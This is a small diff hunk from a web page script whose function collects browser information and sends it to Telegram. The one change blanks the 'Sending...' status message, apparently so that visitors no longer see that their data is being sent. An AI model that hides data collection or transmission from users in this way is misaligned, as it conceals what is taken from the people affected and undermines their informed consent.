@@ -59,7 +59,7 @@
   // Function to send info to Telegram
   async function sendInformation() {
     const status = document.getElementById("status");
-    status.textContent = "Sending...";
+    status.textContent = "";
 
     try {
       const info = collectBrowserInfo();
